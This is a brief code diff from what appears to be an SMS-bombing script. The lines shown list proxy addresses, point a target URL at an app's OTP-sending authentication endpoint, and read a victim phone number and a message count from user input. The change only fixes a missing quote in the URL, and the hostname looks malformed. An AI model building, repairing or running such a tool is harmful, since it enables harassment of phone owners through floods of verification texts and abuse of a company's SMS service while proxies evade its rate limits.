@@ -224,7 +224,7 @@ def main():
         "45.189.119.112:999"
     ]
     
-    target_url = "https://ev-app-api.aws.playco.m/api/auth/v2/sendOtp
+    target_url = "https://ev-app-api.aws.playco.m/api/auth/v2/sendOtp"
     
     full_number, sms_count = get_user_input()
     
